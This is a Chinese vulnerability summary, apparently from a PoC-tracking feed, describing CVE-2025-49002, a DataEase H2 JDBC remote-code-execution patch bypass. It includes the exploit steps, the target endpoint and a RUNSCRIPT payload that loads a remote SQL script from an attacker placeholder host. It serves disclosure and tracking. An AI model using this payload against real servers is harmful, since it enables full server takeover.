## CVE-2025-49002-DataEase-H2数据库远程代码执行绕过

**漏洞编号:** CVE-2025-49002

**漏洞类型:** 远程代码执行

**影响应用:** DataEase

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 2.10.10

**利用条件:** 目标服务器开启网络服务，攻击者可以发送恶意请求。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

漏洞存在于DataEase中，是对CVE-2025-32966补丁的绕过。攻击者可以利用H2数据库的`RUNSCRIPT`功能，通过构造特制的JDBC URL，加载远程的SQL脚本并执行，从而实现远程代码执行。绕过的关键在于利用大小写不敏感性绕过对`INIT`和`RUNSCRIPT`的禁用。

**利用方式：**
1.  POC首先构造包含恶意JDBC URL的JSON数据包。
2.  JDBC URL中，使用`RUNSCRIPT FROM 'http://your-vps:2333/poc.sql'`，指定远程SQL脚本的URL。注意这里需要将URL替换为攻击者控制的服务器地址。
3.  POC发送POST请求到`/de2api/datasource/validate`接口，将构造的JSON数据包作为请求体发送。
4.  DataEase服务端解析该JDBC URL，并执行远程SQL脚本，从而实现远程代码执行。

**有效性评估：**
提供的POC代码基本有效。 它构造了一个包含恶意JDBC URL的请求，旨在利用 DataEase 的漏洞执行远程代码。 通过发送精心构造的请求到 `/de2api/datasource/validate` 端点，并包含恶意的 H2 JDBC 连接字符串，可以触发 RCE。

**投毒风险评估：**
根据提供的POC代码，没有明显的投毒行为。 POC的目的看起来是验证漏洞是否存在。 远程脚本`http://your-vps:2333/poc.sql`才包含实际的恶意载荷，这部分需要用户自己配置，风险可控。 因此，投毒风险评估为0%。POC本身只是利用漏洞，不包含任何隐藏的恶意代码用于影响其他用户或者系统。

**项目地址:** [jiuzui129-arch/CVE-2025-49002](https://github.com/jiuzui129-arch/CVE-2025-49002)

**漏洞详情:** [CVE-2025-49002](https://nvd.nist.gov/vuln/detail/CVE-2025-49002)